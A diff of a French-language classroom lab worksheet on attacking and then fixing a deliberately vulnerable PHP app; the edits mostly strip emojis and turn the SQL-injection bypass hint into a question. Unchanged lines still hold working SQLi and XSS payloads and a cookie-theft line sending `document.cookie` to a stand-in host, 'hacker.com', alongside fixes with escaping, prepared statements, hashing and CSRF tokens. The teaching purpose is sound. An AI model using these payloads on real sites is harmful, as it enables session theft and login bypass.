@@ -41,19 +41,18 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     L'application vérifie le mot de passe en base de données. Si la requête est mal écrite, elle peut être manipulée.
 
-    ### 🕵️‍♂️ Analyse du Code (Login)
-    Ouvrir `lab_securite.php` et regarder la **ligne 31** :
-    ```php
-    $sql = "SELECT * FROM users WHERE username = '$u' AND password = '$p'";
-    ```
-    Le développeur insère directement les variables `$u` (utilisateur) et `$p` (mot de passe) dans la chaîne SQL.
+    ### Analyse du Code (Login)
+    Ouvrir `lab_securite.php` et regarder la **ligne 31**.
 
-    ### 🎯 Défi 2.1 : Contournement d'authentification
-    Tenter de se connecter en tant qu'**admin** sans connaître le mot de passe.
-    *   **Objectif :** Transformer la condition `password = '...'` en `password = '' OR 1=1`.
-    *   **Payload à tester :** `' OR 1=1 --`
+    Comment sont inserées les données dans la base de données ? Est-ce sécurisé?
 
-    ### 🎯 Défi 2.2 : Vol de données (UNION Based)
+    ### Défi 2.1 : Contournement d'authentification
+    On va tenter de se connecter en tant qu'**admin** sans connaître le mot de passe.
+    Ce formulaire n'est pas protégé contre les payload.
+    
+    Quel payload peut être utilisé pour passer outre le mot de passe ?
+
+    ### Défi 2.2 : Vol de données (UNION Based)
     Une fois la connexion établie, le champ de recherche de notes est aussi vulnérable.
     La commande SQL `UNION` permet de combiner les résultats de deux requêtes.
     *   **Objectif :** Afficher la liste des utilisateurs et leurs mots de passe à la place des notes.
@@ -70,32 +69,32 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     Si un site affiche ce que l'utilisateur tape sans nettoyer le texte, il est possible d'y insérer du code JavaScript.
 
-    ### 🕵️‍♂️ Analyse du Code (Affichage Recherche)
+    ### Analyse du Code (Affichage Recherche)
     Regarder la **ligne 122** :
     ```php
     echo "<p>Résultats pour : <b>" . $q . "</b></p>";
     ```
     La variable `$q` (la recherche) est affichée (echo) telle quelle. Si `$q` contient des balises HTML (`<script>`), elles seront interprétées par le navigateur.
 
-    ### 🎯 Défi 3.1 : XSS Reflected (Le Miroir)
+    ### Défi 3.1 : XSS Reflected (Le Miroir)
     *   **Action :** Dans la barre de recherche, taper : `<script>alert("Hacked")</script>`
     *   **Résultat :** Une fenêtre d'alerte apparaît, prouvant la possibilité d'exécuter du code sur le navigateur de l'utilisateur.
 
-    ### 🎯 Défi 3.2 : Vol de Session (Session Hijacking)
+    ### Défi 3.2 : Vol de Session (Session Hijacking)
     C'est l'attaque la plus critique. Voler le cookie de session d'un admin (le fameux `PHPSESSID` généré automatiquement par PHP) permet d'usurper son identité.
 
     *   **Action :** Taper : `<script>alert(document.cookie)</script>`
     *   **Question :** Quelle chaîne de caractères s'affiche ? Que représente-t-elle pour le serveur ?
     *   **Note :** Dans une vraie attaque, le script enverrait ce cookie vers un serveur pirate (ex: `window.location='http://hacker.com?cookie='+document.cookie`).
 
-    ### 🕵️‍♂️ Analyse du Code (Livre d'or)
+    ### Analyse du Code (Livre d'or)
     Regarder la **ligne 164** :
     ```php
     echo "<div class='message-box'>" . $m['content'] . "</div>";
     ```
     Les messages stockés en base de données sont réaffichés sans filtre. C'est une XSS **Stored** (Stockée), donc permanente.
 
-    ### 🎯 Défi 3.3 : XSS Stored (Le Champ de Mines)
+    ### Défi 3.3 : XSS Stored (Le Champ de Mines)
     Le "Livre d'or" enregistre les messages en base de données et les réaffiche à tous les visiteurs.
     *   **Action :** Poster le message suivant :
         `Bonjour ! <script>window.location = "https://google.com"</script>`
@@ -112,7 +111,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
     L'attaque CSRF force l'utilisateur à faire une action à son insu.
     Le formulaire "Livre d'or" n'a pas de protection (token CSRF).
 
-    ### 🎯 Défi 4.1 : Création du piège
+    ### Défi 4.1 : Création du piège
     Objectif : En tant qu'attaquant, faire poster "J'aime les renards" par l'admin dans le livre d'or sans qu'il s'en rende compte.
 
     **Procédure guidée :**
@@ -133,7 +132,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     ## Partie 4 bis : Mots de passe et Hachage
 
-    ### 🎯 Défi 4.2 : Audit des mots de passe
+    ### Défi 4.2 : Audit des mots de passe
     
     1.  Réutiliser la faille SQLi pour afficher le contenu de la colonne `password` de la table `users`.
     2.  **Question 1 :** Quel constat faites-vous sur le format de stockage des mots de passe dans la base de données ?
@@ -147,11 +146,11 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     Il est temps de réparer les dégâts. L'objectif est de modifier le code PHP pour le sécuriser.
 
-    ### 🛠️ Mise en place
+    ### Mise en place
     1.  Dupliquer le fichier `lab_securite.php` et le nommer `lab_fixed.php`.
     2.  Ouvrir `lab_fixed.php` dans l'éditeur de code.
 
-    ### 🛠️ Correction 5.1 : Protection contre les XSS
+    ### Correction 5.1 : Protection contre les XSS
     La règle d'or : **"Échapper les données à l'affichage"**.
     Utiliser la fonction `htmlspecialchars()` qui transforme `<script>` en `&lt;script&gt;`.
 
@@ -167,7 +166,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     **Question :** Réessayer les attaques XSS sur `lab_fixed.php`. Comment le navigateur interprète-t-il le script maintenant (voir code source Ctrl+U) ?
 
-    ### 🛠️ Correction 5.2 : Protection contre les SQLi
+    ### Correction 5.2 : Protection contre les SQLi
     La règle d'or : **"Utiliser des requêtes préparées"**.
     Au lieu de coller les variables, utiliser des marqueurs (`:user`) et demander à la base de données de les traiter comme du texte pur, pas du code.
 
@@ -176,7 +175,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
 
     **Question :** Réessayer l'injection `' OR 1=1 --`. Le contournement fonctionne-t-il toujours ? Pourquoi ?
 
-    ### 🛠️ Correction 5.3 : Hachage des mots de passe
+    ### Correction 5.3 : Hachage des mots de passe
     La règle d'or : **"Ne jamais stocker de mot de passe en clair"**.
 
     PHP offre des fonctions natives robustes : `password_hash()` (pour créer) et `password_verify()` (pour vérifier).
@@ -200,7 +199,7 @@ meta: "Durée : 4 heures · Objectif : Attaquer, Comprendre, Réparer"
             }
             ```
 
-    ### 🛠️ Correction 5.4 : Protection CSRF (Token)
+    ### Correction 5.4 : Protection CSRF (Token)
     La règle d'or : **"Vérifier l'origine de la requête"**.
 
     On ajoute un jeton aléatoire (token) dans la session et dans le formulaire. Si le formulaire envoyé ne contient pas le bon token, on rejette.
